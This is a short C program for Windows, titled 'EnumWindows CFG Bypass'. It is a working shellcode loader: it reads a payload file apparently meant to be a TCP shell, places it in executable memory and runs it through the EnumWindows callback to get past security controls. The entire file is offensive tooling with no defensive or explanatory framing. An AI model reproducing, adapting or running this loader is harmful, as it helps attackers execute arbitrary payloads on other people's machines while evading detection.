#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")

int main(void) {
    printf("=== EnumWindows CFG Bypass ===\n");
    FILE* f = fopen("tcp_windows_amd64.bin", "rb");
    if (!f) { printf("[-] shellcode not found\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char* sc = (unsigned char*)VirtualAlloc(
        NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!sc) { printf("[-] VirtualAlloc failed\n"); fclose(f); return 1; }
    fread(sc, 1, len, f);
    fclose(f);
    printf("[+] Shellcode: %ld bytes @ %p\n", len, sc);
    printf("[*] Calling EnumWindows...\n");
    fflush(stdout);
    BOOL r = EnumWindows((WNDENUMPROC)sc, (LPARAM)sc);
    printf("[+] EnumWindows returned: %d\n", r);
    VirtualFree(sc, 0, MEM_RELEASE);
    return 0;
}
